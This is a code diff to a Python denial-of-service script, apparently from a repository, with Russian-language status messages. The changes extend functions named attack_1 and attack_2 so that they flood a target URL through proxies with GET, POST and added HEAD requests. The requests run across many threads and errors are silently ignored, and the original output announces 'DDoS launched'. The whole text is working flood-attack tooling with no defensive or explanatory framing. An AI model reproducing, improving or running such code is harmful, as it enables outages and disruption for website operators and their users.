@@ -22,7 +22,14 @@ def attack_1(url, proxy, headers):
 
         try:
             cf.get(url, proxies=proxieshttp, headers=header)
+        except:
+            pass
+        try:
             cf.post(url, proxies=proxieshttp, headers=header)
+        except:
+            pass
+        try:
+            cf.head(url, proxies=proxieshttp, headers=header)
         except:
             pass
 
@@ -35,13 +42,20 @@ def attack_2(url, proxy, headers):
 
         try:
             cf.get(url, proxies=proxieshttps, headers=header)
+        except:
+            pass
+        try:
             cf.post(url, proxies=proxieshttps, headers=header)
         except:
             pass
+        try:
+            cf.head(url, proxies=proxieshttps, headers=header)
+        except:
+            pass
 
+print('Запуск потоков!')
 for i in range(thread):
     for a in proxy_http:
         threading.Thread(target=attack_1, args=(adress, a, userag)).start()
         threading.Thread(target=attack_2, args=(adress, a, userag)).start()
-
-print('DDOS запущен')
+print('Все потоки запущены!')
